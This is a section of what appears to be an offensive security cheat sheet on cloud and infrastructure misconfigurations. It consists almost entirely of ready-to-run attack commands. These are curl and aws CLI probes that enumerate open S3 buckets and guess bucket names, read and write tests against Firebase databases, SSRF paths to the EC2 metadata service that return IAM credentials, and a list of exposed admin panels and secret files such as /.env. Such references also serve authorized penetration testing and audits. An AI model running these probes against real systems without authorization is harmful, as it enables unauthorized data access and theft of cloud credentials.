## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

